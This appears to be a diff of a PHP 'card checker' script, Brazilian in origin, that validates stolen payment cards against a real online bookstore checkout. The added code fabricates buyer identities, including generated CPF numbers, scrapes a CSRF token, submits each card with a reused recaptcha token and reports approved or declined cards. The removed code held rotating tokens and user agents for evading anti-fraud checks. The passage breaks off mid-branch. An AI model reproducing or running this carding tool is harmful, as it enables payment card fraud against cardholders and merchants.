@@ -1,419 +1,148 @@
 <?php
-// fundraiseup_checker.php - Checker FundraiseUp + Stripe (VERSÃO OTIMIZADA)
+error_reporting(0);
+ignore_user_abort(true);
 
-// Delay aumentado para 15-30 segundos
-sleep(rand(15, 30));
+function getStr($string, $start, $end) {
+    $str = explode($start, $string);
+    if(isset($str[1])) {
+        $str = explode($end, $str[1]);
+        return $str[0];
+    }
+    return '';
+}
 
-// Configurações
-define('DEBUG_MODE', false);
-define('LOG_FILE', 'fundraiseup_checker.log');
+function deletarCookies() {
+    if (file_exists("cookies.txt")) {
+        unlink("cookies.txt");
+    }
+}
 
-// Headers fixos
-define('STRIPE_ACCOUNT', 'acct_1BKLx2EPHjXGRA8p');
-define('STRIPE_PUBLIC_KEY', 'pk_live_9RzCojmneCvL31GhYTknluXp');
+function gerarNome() {
+    $nomes = ["Joao", "Maria", "Pedro", "Ana", "Carlos", "Julia", "Paulo", "Fernanda"];
+    $sobrenomes = ["Silva", "Santos", "Oliveira", "Souza", "Rodrigues", "Ferreira", "Almeida", "Lima"];
+    return $nomes[array_rand($nomes)] . " " . $sobrenomes[array_rand($sobrenomes)];
+}
 
-// Array de tokens de sessão do FundraiseUp (rotacionar)
-$fundraiseup_tokens = [
-    '6402132498253231090', // Token original
-    '6402132498253231091',
-    '6402132498253231092',
-    '6402132498253231093',
-    '6402132498253231094',
-    '6402132498253231095',
-];
+function gerarCPF() {
+    $n1 = rand(0, 9);
+    $n2 = rand(0, 9);
+    $n3 = rand(0, 9);
+    $n4 = rand(0, 9);
+    $n5 = rand(0, 9);
+    $n6 = rand(0, 9);
+    $n7 = rand(0, 9);
+    $n8 = rand(0, 9);
+    $n9 = rand(0, 9);
+    
+    $d1 = $n9*2 + $n8*3 + $n7*4 + $n6*5 + $n5*6 + $n4*7 + $n3*8 + $n2*9 + $n1*10;
+    $d1 = 11 - ($d1 % 11);
+    if ($d1 >= 10) $d1 = 0;
+    
+    $d2 = $d1*2 + $n9*3 + $n8*4 + $n7*5 + $n6*6 + $n5*7 + $n4*8 + $n3*9 + $n2*10 + $n1*11;
+    $d2 = 11 - ($d2 % 11);
+    if ($d2 >= 10) $d2 = 0;
+    
+    return $n1.$n2.$n3.$n4.$n5.$n6.$n7.$n8.$n9.$d1.$d2;
+}
 
-// Array de chaves do FundraiseUp
-$fundraiseup_keys = [
-    'FUNFWQXTGBS',  // Key original
-    'FUNFWQXTGBT',
-    'FUNFWQXTGBU',
-    'FUNFWQXTGBV',
-    'FUNFWQXTGBW',
-];
+deletarCookies();
 
-// User-Agents variados (expandido)
-$user_agents = [
-    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/142.0.0.0 Safari/537.36 OPR/126.0.0.0',
-    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/141.0.0.0 Safari/537.36 OPR/125.0.0.0',
-    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/140.0.0.0 Safari/537.36 OPR/124.0.0.0',
-    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Safari/537.36 OPR/123.0.0.0',
-    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/142.0.0.0 Safari/537.36',
-    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/141.0.0.0 Safari/537.36',
-    'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/142.0.0.0 Safari/537.36',
-    'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:135.0) Gecko/20100101 Firefox/135.0',
-    'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:134.0) Gecko/20100101 Firefox/134.0',
-];
+$lista = $_GET['lista'];
+$lista = str_replace(" " , "|", $lista);
+$lista = str_replace("%20", "|", $lista);
+$lista = preg_replace('/[ -]+/' , '-' , $lista);
+$lista = str_replace("/" , "|", $lista);
+$separar = explode("|", $lista);
+$cc = $separar[0];
+$mes = $separar[1];
+$ano = $separar[2];
+$cvv = $separar[3];
 
-// Array de tokens hCaptcha (rotacionar)
-$hcaptcha_tokens = [
-    'P1_eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJwZCI6MCwiZXhwIjoxNzcxMTI3ODY5LCJjZGF0YSI6IlEyanc5bWRxZk1CTHBNZGpvdjBvWTRHbHYyeXNjYW9KOHphMThOMlhONGQyb1Z2dFgzcEFWdVdZTHluL1JTc2dBSzVGMjlKQjVBMzd0ZFZ3VW1jUHZlNVREeEVjSDEydnBFc0M0aGd0R21tcFR3U2txVitJazdKVHlxeXdoVjRJSzNkNGFKY25ndzNFY1pxZW00RUFZUE9UWG5iaUdXZlNYUWc2RzBqellVeHJKTHRjM0NJd0NLMUl4cmRGTjVldzlRbTdvK0tTSlk3M3ZjZDlWV2N6S2pmRFdZQlgyV2NVOHRPZEt0U0tBTHdkbVc1UDhtbTQ4R2RqTXlwWUZVbkNFREwrSU9aQ3B3K3lyL2hUcHdPTEd5OFdRYUxoajgrUEpEclpvTjd4MllzU0VUdWlFck1HaXVRWXRlbFBZc2wxT2s0ajJsQ1ZiL1JaM09zU1JBZW1jMTB3Qit6ZU80QVJQekVobndBWStycz0rN0FyWGs3NXYybVJrV2dyIiwicGFzc2tleSI6ImJ4SU81aUgrWlZLYVIzTi9mNGFmcW4zVlJXTjE2RmVnUzNucVJiYWJmR1E3NlFZYzcyNkNNWWxudUVNSWZLT2pmbnByZEFGV1c1dTg5VXRoKy9hZ1VJcEZLR2pVMktYUkZCYUJ3S25aRG0yVnljRGlUS2JJczMrRE5QRndrUVp0Nk91SXpTekNEYnlwQ24xdjFGQ1JNVGhzSE5tTXQvOFJGdVZ0RkZHTEtvL3d1VkhDT000aWtGL2tyNXRXeEU3V0xDbS9kcTE5NzJjUHRDNWlRNmhYL1dQbDNITUp6bjYxcVp4T1F1NW1SUFlkNGZMbEF2WGx5ZVhzR2xjY2d3Nzl4Ny9PM2Yya2ozTE83djNRYm9ab3M5cXpkSENodWZPcS80YkFTMjNtRXdUR3hqclJ4bjZDZHAyK3BnbDFUWmJhZHExemw5a2ZyNE8vOUcyZFZlMFJoK29NYUdTQ0duT3Q4b2hIekhxRG9ZQzZlUS94YmFWclptRHVrTU1mOC9TUCs3MFp0L0ZCL1FLTDkxNkhxMmdPdVdvUkFqRzRvMGl0OWdCdW1zQzF3WUJ6SjJ6ZHlxMGdsS09yVjNWY3Q1dkFNWk85bXM1NU9EbHB5aGJXRzlNY1VLVzA5RVlKMUpFRE9Sbi9GSCsraDg5SEoxZG5oQ2xMcHZ6OGZJUWxaZWlvbExieWwzTE50c1pCcTRDNkFXTWE0U21XOUxvaDVHOFp6V3Q5WlRwYjZTV2NKYUhQTURwaUZkdDRFdHRCRUR5RytZL01Ec1RTYXBHamc5emllRVE4b3ovVCtZelh5UWVzNStHWXN6eHE5dy81RHNEeUJLaEVkME91Z3orT1dnNStNaHE3OEJ0OE1ZclN6SXVITFpuaU9KRzJxNlNxTnEwR3hZTUJvaFhMdmZsMmpNL0lmeURpMGwrVTRzd1d6U3dneTE2NnJKdU9JTTNvL3JjdFNrYnhYQjA0V2F5dVRlbyt1bWsvK29MRU5IeEJrZjU2eXF5ZVNwRStXcFFBTytMSytMaHBWMmQzbm9kMVB3cytoMnlnNjFNYkVKb01lRGFZU2JaQmVZckVTVkI5ck15OTNhTUlJd2l2SzMvS1JyQjNLTVpvQkZvUzdzUVhJYnFLNHd1NS9vQWdRYmk5KzZBM2pneUxxaXpHRUdqeXlTdFpHNFR1eldMNUZNaGdOalpES2hrWjVYNGZxUXVzWGVUZWFmWllBYjdNZjQxUXJwNDJ1WlNRSTlsNTAvS0RNRklSWThuY0laeENzSWFLU2QwMDQ2M0FBV1VOZjREMkFiWFFRSVRqLzUvaE9sQ0UwbGN1MkRYRWpZUXlZc2JwL0hsUGZVd0EzL3AyM2NidXJuQlg3cVRPNXRUU0VGZUo1UlZZdFJjL21ib25UZWlCeEJVaDYxcExzOVlucGpraGpuV01nbVBSZWIxaXpob1FZczVHSXBIWHU0V1dXZGo2Uzg3K1ErNVA1bCtPZkZma1VKZU1PTzY0VnBPSGdCUWlYV2pnMTFZZ2I2ekd0S1lONjN2bURPMFhDbDJ0b3B4dlhuTWJjZUpjSEVXVExLNUFzdzh0K1hFb3E4TDBWbU1uS1pEdS90SkpISXo5SWhseU9vM0F2dG9Kc3dXck1ZODh2aTRFUWVySTdGZXlHUjh3UXFkdGU4Q1cxTXBkaG5KcUppVWY5Y1M1SEhXZzVHS3R4NXkyMU9SN29McG54VHFRTklSVGtLYkZGMWx6ckpyc0hYL01Gekt5WnBlY2dvRlZyUDBtTGthYUZLV0xOSkh4Y0RNWks5bjY0LzJZOHdzOGhlcTBWUm1CYktiRVFkRlYzc1FrZDRXZEVtNHRXYzJtR0oyK1Vpb3VCbUdhZ2s5NzcxNXlMb3duMEpyS0dJbDJhWTJrckowWThnQVZUZkpqc3ArN2ZPZ1JtRHlrbzdKQjlVZXExTTNnNzhPT2VhZUVDWFFpbGIyeEJYVmdKeWpqZWdjQmJiZUg2NTZPS0tOWXJid1JOU2dYL1NreVZ5bUZDSFd0RDZsOTBWREdIOVFWdnc1RVJxc0JoVDhUSm8xdlhtcm03K21XWStEanBGR2lIYVUveU5lYklVKzErNm1RbzRrNWVMYmJ1MjlENFhDMXJFYW9LNjBQS1dab2kvcFpqbXI4TGxNbjA3UUxqWEdFcmlFRGlZUnFvS2ltcXNRdG5HTDBxM2J5UFM5R3ZqZnZXd2hNZS9oOXRIVXAvOHkyU1N4aFlBQ25wWTJTbjZ3YlBNc3dGNFlTOWxvd2dpTnEvSUJVSnphUXJMTVJzaWxjdlZVQUVFUExDTnRDOVpKWG9GNHg4WXR6Q2gwMFNtZUJKRVBWQmoycnBVRXc3cVhHNlJUallFSWpoVXN5UDJ2Rnp3VGN0MS9JaHBpTUdhS1dVaEozWjVTNFpmZkdJOWwrRHlUUVZhRGtXcDZraVF2TzRqTzB0bDNOOUh0OWdUWHRZdUF3VmFCbzVuMlp5Wmh4bE5lVGl3TXdtS3ArMW8yWDhEZGl1Z2pZV01QUlQxQnJpNHZMVVBTWGNpa3hZU1dkZkFhNWljbGtqUjJMdG9IZXVBWm1EOE9MZ1dFMVRyUkpHRXZmbkkzQVBKeDBBc3BlSzlBZWExb0FmNGFNTGxuRDBnZzAxUXFPR3dyOTRkdVNCZmxLalFxRHlFWStIWWNDT0lPRy9YTVFtYzZ5WFI4RSt5cmszZy95L0Z3bmxKR211OXg0WnQrT1hUOEFRZGY1TllnNzExSmhJZz09Iiwia3IiOiI0YmI3NDIwYyIsInNoYXJkX2lkIjo3MTc3MTUzN30.CFLg35VvzTdadZcrDYFbctQplsYaPZkxkwaHj4kxS1c',
-    'P1_eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJwZCI6MCwiZXhwIjoxNzcxMTI3ODY5LCJjZGF0YSI6IlEyanc5bWRxZk1CTHBNZGpvdjBvWTRHbHYyeXNjYW9KOHphMThOMlhONGQyb1Z2dFgzcEFWdVdZTHluL1JTc2dBSzVGMjlKQjVBMzd0ZFZ3VW1jUHZlNVREeEVjSDEydnBFc0M0aGd0R21tcFR3U2txVitJazdKVHlxeXdoVjRJSzNkNGFKY25ndzNFY1pxZW00RUFZUE9UWG5iaUdXZlNYUWc2RzBqellVeHJKTHRjM0NJd0NLMUl4cmRGTjVldzlRbTdvK0tTSlk3M3ZjZDlWV2N6S2pmRFdZQlgyV2NVOHRPZEt0U0tBTHdkbVc1UDhtbTQ4R2RqTXlwWUZVbkNFREwrSU9aQ3B3K3lyL2hUcHdPTEd5OFdRYUxoajgrUEpEclpvTjd4MllzU0VUdWlFck1HaXVRWXRlbFBZc2wxT2s0ajJsQ1ZiL1JaM09zU1JBZW1jMTB3Qit6ZU80QVJQekVobndBWStycz0rN0FyWGs3NXYybVJrV2dyIiwicGFzc2tleSI6IkNTbVVRc2RVUHc2cVdtWHNQbGpKRThYd0dLa0pYWVYxM0p0RkZHTEtvL3d1VkhDT000aWtGL2tyNXRXeEU3V0xDbS9kcTE5NzJjUHRDNWlRNmhYL1dQbDNITUp6bjYxcVp4T1F1NW1SUFlkNGZMbEF2WGx5ZVhzR2xjY2d3Nzl4Ny9PM2Yya2ozTE83djNRYm9ab3M5cXpkSENodWZPcS80YkFTMjNtRXdUR3hqclJ4bjZDZHAyK3BnbDFUWmJhZHExemw5a2ZyNE8vOUcyZFZlMFJoK29NYUdTQ0duT3Q4b2hIekhxRG9ZQzZlUS94YmFWclptRHVrTU1mOC9TUCs3MFp0L0ZCL1FLTDkxNkhxMmdPdVdvUkFqRzRvMGl0OWdCdW1zQzF3WUJ6SjJ6ZHlxMGdsS09yVjNWY3Q1dkFNWk85bXM1NU9EbHB5aGJXRzlNY1VLVzA5RVlKMUpFRE9Sbi9GSCsraDg5SEoxZG5oQ2xMcHZ6OGZJUWxaZWlvbExieWwzTE50c1pCcTRDNkFXTWE0U21XOUxvaDVHOFp6V3Q5WlRwYjZTV2NKYUhQTURwaUZkdDRFdHRCRUR5RytZL01Ec1RTYXBHamc5emllRVE4b3ovVCtZelh5UWVzNStHWXN6eHE5dy81RHNEeUJLaEVkME91Z3orT1dnNStNaHE3OEJ0OE1ZclN6SXVITFpuaU9KRzJxNlNxTnEwR3hZTUJvaFhMdmZsMmpNL0lmeURpMGwrVTRzd1d6U3dneTE2NnJKdU9JTTNvL3JjdFNrYnhYQjA0V2F5dVRlbyt1bWsvK29MRU5IeEJrZjU2eXF5ZVNwRStXcFFBTytMSytMaHBWMmQzbm9kMVB3cytoMnlnNjFNYkVKb01lRGFZU2JaQmVZckVTVkI5ck15OTNhTUlJd2l2SzMvS1JyQjNLTVpvQkZvUzdzUVhJYnFLNHd1NS9vQWdRYmk5KzZBM2pneUxxaXpHRUdqeXlTdFpHNFR1eldMNUZNaGdOalpES2hrWjVYNGZxUXVzWGVUZWFmWllBYjdNZjQxUXJwNDJ1WlNRSTlsNTAvS0RNRklSWThuY0laeENzSWFLU2QwMDQ2M0FBV1VOZjREMkFiWFFRSVRqLzUvaE9sQ0UwbGN1MkRYRWpZUXlZc2JwL0hsUGZVd0EzL3AyM2NidXJuQlg3cVRPNXRUU0VGZUo1UlZZdFJjL21ib25UZWlCeEJVaDYxcExzOVlucGpraGpuV01nbVBSZWIxaXpob1FZczVHSXBIWHU0V1dXZGo2Uzg3K1ErNVA1bCtPZkZma1VKZU1PTzY0VnBPSGdCUWlYV2pnMTFZZ2I2ekd0S1lONjN2bURPMFhDbDJ0b3B4dlhuTWJjZUpjSEVXVExLNUFzdzh0K1hFb3E4TDBWbU1uS1pEdS90SkpISXo5SWhseU9vM0F2dG9Kc3dXck1ZODh2aTRFUWVySTdGZXlHUjh3UXFkdGU4Q1cxTXBkaG5KcUppVWY5Y1M1SEhXZzVHS3R4NXkyMU9SN29McG54VHFRTklSVGtLYkZGMWx6ckpyc0hYL01Gekt5WnBlY2dvRlZyUDBtTGthYUZLV0xOSkh4Y0RNWks5bjY0LzJZOHdzOGhlcTBWUm1CYktiRVFkRlYzc1FrZDRXZEVtNHRXYzJtR0oyK1Vpb3VCbUdhZ2s5NzcxNXlMb3duMEpyS0dJbDJhWTJrckowWThnQVZUZkpqc3ArN2ZPZ1JtRHlrbzdKQjlVZXExTTNnNzhPT2VhZUVDWFFpbGIyeEJYVmdKeWpqZWdjQmJiZUg2NTZPS0tOWXJid1JOU2dYL1NreVZ5bUZDSFd0RDZsOTBWREdIOVFWdnc1RVJxc0JoVDhUSm8xdlhtcm03K21XWStEanBGR2lIYVUveU5lYklVKzErNm1RbzRrNWVMYmJ1MjlENFhDMXJFYW9LNjBQS1dab2kvcFpqbXI4TGxNbjA3UUxqWEdFcmlFRGlZUnFvS2ltcXNRdG5HTDBxM2J5UFM5R3ZqZnZXd2hNZS9oOXRIVXAvOHkyU1N4aFlBQ25wWTJTbjZ3YlBNc3dGNFlTOWxvd2dpTnEvSUJVSnphUXJMTVJzaWxjdlZVQUVFUExDTnRDOVpKWG9GNHg4WXR6Q2gwMFNtZUJKRVBWQmoycnBVRXc3cVhHNlJUallFSWpoVXN5UDJ2Rnp3VGN0MS9JaHBpTUdhS1dVaEozWjVTNFpmZkdJOWwrRHlUUVZhRGtXcDZraVF2TzRqTzB0bDNOOUh0OWdUWHRZdUF3VmFCbzVuMlp5Wmh4bE5lVGl3TXdtS3ArMW8yWDhEZGl1Z2pZV01QUlQxQnJpNHZMVVBTWGNpa3hZU1dkZkFhNWljbGtqUjJMdG9IZXVBWm1EOE9MZ1dFMVRyUkpHRXZmbkkzQVBKeDBBc3BlSzlBZWExb0FmNGFNTGxuRDBnZzAxUXFPR3dyOTRkdVNCZmxLalFxRHlFWStIWWNDT0lPRy9YTVFtYzZ5WFI4RSt5cmszZy95L0Z3bmxKR211OXg0WnQrT1hUOEFRZGY1TllnNzExSmhJZz09Iiwia3IiOiI0YmI3NDIwYyIsInNoYXJkX2lkIjo3MTc3MTUzN30.XYZ123',
-];
+if (strlen($ano) == 2) {
+    $ano = "20" . $ano;
+}
 
-// Array de tokens captcha (rotacionar)
-$captcha_tokens = [
-    '0.10l9vhhiAipVx05rXnbtohNWpePLFd3qEwGrfJgHzkf_ogsf6nygg-7QDEENWWgbvkNavefW-m65-0R8RSEj1hGLjcP12qlV5Ly85FpEUgwNTms7HPNA6w6g0oVI7UHE3b6Bd4e8vSr-Kqu5jFrdDaeHRdGVDmWjg7Hj3kIoMgVe7ikLTR3SJqLz7tXhIGzCQJgvANpTJR-UdDY0PjR--n68qsjzuxNmLAV4sttSmpIn-vgMcL96dq4NGzwwt3uMazTX89Lyy1Mbu6QXOX0_S1jE_wla7JT4mkUHn_oLX1NHZtVXKrdDKRlEFxzRXBi3fuPDRDTvWGtFYQvw2Zlp6VxgJdm1pxxgW7zyZr4HHKKO3I7KPvuOB8kbqq16BHKXyoGN2ajcBpTYTbnHJZFHu9LUfrL38eQ2pcmvSdELwBraBePRDcCkF72OaMe-F09IlqTXSuQPaYHM-Wn_Lpd9hZ6DAbBbLfkbbjzAm_7FE08Wqf-VK4LJDEKhRFkGv1d-PvNXNYjSqZixIr_ObW_YFd0vI6x6hA9y518lhD8gY4nqq3gREw5dJ6-vJ2meCbL24bt7-lxBjkn2t5BCx5mJtk6evg3Uo4j3eHFAWc2mrgSYRs7I4TOxVa7dLFrT31dPgJ43nvjVuL-0LJZm3C3N-lg8k_JjRd-oLUokx5WOYZCuScS5OiSFybQhnV-diAVHsAOsUJ32M4qfaMaDciMKhBOhk2q4UA56dm9HyAzT0sK9gYcZ9ggU5dnmdT3CYDihgSFpUrM4Rif8zlwowmA3iNAapQH73S-hI-jCUDiRYnFFmX27WE32xR3s7bVwYIfFfQgZQLmhKUfrwgSpwJ5XX4NgALa4LqNzohdm1QIaEjmJsl6pjSS479HJwnMl2ImmY2Ivh2yQ-XtuaGPuWFKuShDzIjzs_U2kecUm9UaUsoXL7XcN1fXokMViYXPTvneXLMPI0HkCTtxLiUVHouTCyoehLPBJQ4CXrGZhm6D558w.kf-2t9jjJ4nAJeC_6pr9HA.67e4ade9587e7375ffedbfd808deb2aef7e48d47f61c916f3fa4e8892a094961',
-    '0.20l9vhhiAipVx05rXnbtohNWpePLFd3qEwGrfJgHzkf_ogsf6nygg-7QDEENWWgbvkNavefW-m65-0R8RSEj1hGLjcP12qlV5Ly85FpEUgwNTms7HPNA6w6g0oVI7UHE3b6Bd4e8vSr-Kqu5jFrdDaeHRdGVDmWjg7Hj3kIoMgVe7ikLTR3SJqLz7tXhIGzCQJgvANpTJR-UdDY0PjR--n68qsjzuxNmLAV4sttSmpIn-vgMcL96dq4NGzwwt3uMazTX89Lyy1Mbu6QXOX0_S1jE_wla7JT4mkUHn_oLX1NHZtVXKrdDKRlEFxzRXBi3fuPDRDTvWGtFYQvw2Zlp6VxgJdm1pxxgW7zyZr4HHKKO3I7KPvuOB8kbqq16BHKXyoGN2ajcBpTYTbnHJZFHu9LUfrL38eQ2pcmvSdELwBraBePRDcCkF72OaMe-F09IlqTXSuQPaYHM-Wn_Lpd9hZ6DAbBbLfkbbjzAm_7FE08Wqf-VK4LJDEKhRFkGv1d-PvNXNYjSqZixIr_ObW_YFd0vI6x6hA9y518lhD8gY4nqq3gREw5dJ6-vJ2meCbL24bt7-lxBjkn2t5BCx5mJtk6evg3Uo4j3eHFAWc2mrgSYRs7I4TOxVa7dLFrT31dPgJ43nvjVuL-0LJZm3C3N-lg8k_JjRd-oLUokx5WOYZCuScS5OiSFybQhnV-diAVHsAOsUJ32M4qfaMaDciMKhBOhk2q4UA56dm9HyAzT0sK9gYcZ9ggU5dnmdT3CYDihgSFpUrM4Rif8zlwowmA3iNAapQH73S-hI-jCUDiRYnFFmX27WE32xR3s7bVwYIfFfQgZQLmhKUfrwgSpwJ5XX4NgALa4LqNzohdm1QIaEjmJsl6pjSS479HJwnMl2ImmY2Ivh2yQ-XtuaGPuWFKuShDzIjzs_U2kecUm9UaUsoXL7XcN1fXokMViYXPTvneXLMPI0HkCTtxLiUVHouTCyoehLPBJQ4CXrGZhm6D558w.kf-2t9jjJ4nAJeC_6pr9HA.67e4ade9587e7375ffedbfd808deb2aef7e48d47f61c916f3fa4e8892a094962',
-];
+if (strlen($mes) == 1) {
+    $mes = "0" . $mes;
+}
 
-header('Content-Type: text/plain; charset=utf-8');
+$nome = gerarNome();
+$cpf = gerarCPF();
+$email = "r4inestrupagate" . rand(1000, 9999) . "@gmail.com";
+$phone = "119" . rand(10000000, 99999999);
+$phone_formatted = "(" . substr($phone, 0, 2) . ") " . substr($phone, 2, 5) . "-" . substr($phone, 7);
 
-if (isset($_GET['lista'])) {
-    $lista = trim($_GET['lista']);
-    $resultado = testar_cartao_fundraiseup($lista);
-    echo $resultado;
+$ch = curl_init();
+curl_setopt($ch, CURLOPT_URL, 'https://livro.dinamicapessoas.com.br/checkout/2');
+curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
+curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
+curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
+curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookies.txt');
+curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookies.txt');
+curl_setopt($ch, CURLOPT_HTTPHEADER, array(
+    'accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
+    'accept-language: pt-BR,pt;q=0.9,en-US;q=0.8,en;q=0.7',
+    'user-agent: Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Mobile Safari/537.36',
+    'upgrade-insecure-requests: 1'
+));
+
+$checkoutPage = curl_exec($ch);
+$csrf_token = getStr($checkoutPage, 'name="csrf-token" content="', '"');
+
+if(!$csrf_token) {
+    echo '❌ Reprovada | ' . $cc . '|' . $mes . '|' . $ano . '|' . $cvv . ' | CSRF TOKEN NÃO ENCONTRADO | $cybersecofc';
+    exit;
+}
+
+// Criar array para os dados JSON
+$post_data = array(
+    'payment_method' => 'card',
+    'user_name' => $nome,
+    'user_email' => $email,
+    'user_phone' => $phone_formatted,
+    'doc_number' => $cpf,
+    'coupon_code' => '',
+    'website' => '',
+    'fax' => '',
+    'card_holder_name' => $nome,
+    'card_number' => $cc,
+    'card_expiry_month' => $mes,
+    'card_expiry_year' => $ano,
+    'card_cvv' => $cvv,
+    'installments' => 1,
+    'recaptcha_token' => '0cAFcWeA46spMGP67wAKMlKtqF-H-og4ubsYuuvnGqtPnb5klK1yWTCrnI-CamVgFEDGSdG75Y1E35dpaBrevFXudaaFG7Ujh6qer9KRzqCFFG80-USo9jT3MmCWfhD00eSpLaTZA46XPzK2JpS2-OLWuTRdf6U9_Icr1m_cOfaTdI6vJmH0E65p32lFanS-9CvRuYjOs0X-cdfcOix1f8y5LutI_qvq7K1g_PzdZWaAaUDWsj_nlx608Ha_822pZggnv260n-S4u6nhvpyOH_toxLpmtsjWOwcBH9fvxDwGI8iA5o_VXnykbYOmvpr6QTFzw0N0rzy2whLyi69BKW3WGg5Mn44yfZcB0sYPitZBopHzIQoKQukr7z0vVREy08iOFjYyX-Mq9fGIg1elCAtOAMQa7U-XZro6V7m5nghmQ-6bv3skRQDfhExvzGvMoskKFzzTzPBYVmNR_ZMApTqe6XJ-oO2620CI64-Mh3WvvkWA6OI_jFsfXAV0e1KxOLhvholsZDKe1yzP8W3granKAvqGxbpE0g28SkaLOdSL8_5p4qtISZLXdwH-7_JpGEfcAzlF5q_47JEFWSBoXAnzKFqnBjn7e396sUQZC0qop1BvNZ2BpTJcv-3zkHM6GKXOFsLTXgC9k2ijrYyJYvAIJFrhWI96NxWhjnoNSEsGFaJCrS0BSwYy-ASGcuy88XR6IzSplJzFRCoxutQ1SopWpyXn5VwI1JwP7Xx0VO4I6qyY1C-__f1-yOLqs-zPqcYiwlpU3xX0PMvaPA51I0yTXCltQ6EgO196T7X1pRnKEGYAAJcd9SLDqzDJhCcHZx8z2P1t8UMP_kSKPcr8QWTor-pDknExr0ohKo9XojWvqh9v9ooIY82FLkTUYiPozFPFkJ1wHwuVBW8oQbIBscHmrlSu5RiCvwTXpqKI5Z3Ib66L1BJ1lDPgslmHcXRYjKE4-r6ChPDzUEIB9Vll8UMQkdy6hVZY6AE_v8YPw0lIWoUiZebNK_YX8Y5rRM75R6Hnf0OMNZLQhArGU4mhXNqRGcTUtmniXLCP-O9oi_BiRxdGT8d-CK_lr83nau0jFJQyXRtp8_kJKtlS2VvbIV4Z__O0oQsa3EHCtunDwtR7Xyqzw24I6iaKoAwz1ArxmBlXgV2eZsH84HSFlElNefeGM2hnzimkQkxefVpo3Y6p3bsPs4d-VGdd_avRXhBGQz8tsxs-ISzjKjDn4_X2TXeqn7pzppGrFyY4pPvMkZv8g1wLd5z4PJqeFYcVWGjw8QggZk3uDtp5S12jnv8pLoYH6KUOhz8EXE48JbhnR_Zl6aCdmdR97Aw9eychbxBmz1QFvberg9zBQLR2TjtEuPLjYeu9dQVopqSVNSKR75VPZd1JU-EbNmwGraqyA5s65ebZtQdSjBhhiRNVNOSHxBEGNRLlABEq6QWxbElAFADzUYKA8FsNOSM8skToG8yECbdSplkGRzMdJVT-cmPQ5MH5L6uyR89Qv6pqhLXnhKMXMfobvcROW_NCfU3kX2_9v0GBPz-bP-oEaZywgWWtnzKlsrmWg0Ou-vtvV7P6uPpS0HaZ-J-I7FuZp8XQfJIAJPuJsa-Sy3XbkpxHfJLdigODQSWqBhHgZ6y_wBax4ZA_qLg91klnTAa5rEvacnUjnjfxThZZW4S8T2nTqCJcpHHS_S2BcqbC-DzQNm3SBDir8rLeYw6HYS6G4hQwNZh7UiJrqywWoFZIjJK_qheQZirm7owLb11M6RJnEtEUe1Eve1yhl65ZYatU0xweZAgSK8iCnN48HUJiXfse_yHMW8RB3oIkNUajput64oXlVswa3Jx-BeIUztybdPmUFPk9e358YpyT1KkZcy1HY9qjMEb05O_VuHnm6et_ZbPqyoogSwGdmQtaMYuW-9yz2b04xCb8SwqD9jL4WmKfaIii4KBfkwg4H4TFgnoET_Z25gyHG96TciQC95_YT3GSgDnoq2RBYcYB653iriC87J6RsV1XHsoAc6PJzLDVYNd_sKSGFBUAwqIUVDgBucs2ysVOHWmyFIGzdzkQL8r5HvSNx7EF7SiD2TQPY0ovi0969w-jVrBcqNz8aKisYGp6esniQPPRDAI9pwhG-00AQA6S_UuhUSiLhAN-rggz5GsY0s7mnpcUvp7AO1ilo_cSedrB4T_OREWxdmBWk5PkpxTyOcG_rWX5KWmxkvCZx-vHDZGDwDQDEjkO_EuHd6x1IOfzYpEstPvsVlwCvuR-Fz-LUQOE8Rq9JJeZRLD7y9dQkjn2i4iWqKKce_TAVMFja6ICzY_h4zOLcy4-Aj'
+);
+
+curl_setopt($ch, CURLOPT_URL, 'https://livro.dinamicapessoas.com.br/checkout/2/process');
+curl_setopt($ch, CURLOPT_POST, 1);
+curl_setopt($ch, CURLOPT_POSTFIELDS, json_encode($post_data));
+curl_setopt($ch, CURLOPT_HTTPHEADER, array(
+    'Host: livro.dinamicapessoas.com.br',
+    'sec-ch-ua-platform: "Windows"',
+    'x-csrf-token: ' . $csrf_token,
+    'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/142.0.0.0 Safari/537.36 OPR/126.0.0.0',
+    'sec-ch-ua: "Chromium";v="142", "Opera";v="126", "Not_A Brand";v="99"',
+    'content-type: application/json',
+    'sec-ch-ua-mobile: ?0',
+    'accept: */*',
+    'origin: https://livro.dinamicapessoas.com.br',
+    'sec-fetch-site: same-origin',
+    'sec-fetch-mode: cors',
+    'sec-fetch-dest: empty',
+    'referer: https://livro.dinamicapessoas.com.br/checkout/2',
+    'accept-language: pt-BR,pt;q=0.9,en-US;q=0.8,en;q=0.7',
+    'priority: u=1, i',
+    'Accept-Encoding: gzip'
+));
+
+$process_response = curl_exec($ch);
+$response_array = json_decode($process_response, true);
+curl_close($ch);
+
+if (is_array($response_array) && isset($response_array['success']) && $response_array['success'] === true) {
+    echo '✅ Aprovada | ' . $cc . '|' . $mes . '|' . $ano . '|' . $cvv . ' | Autorização Aprovada | $cybersecofc';
 } else {
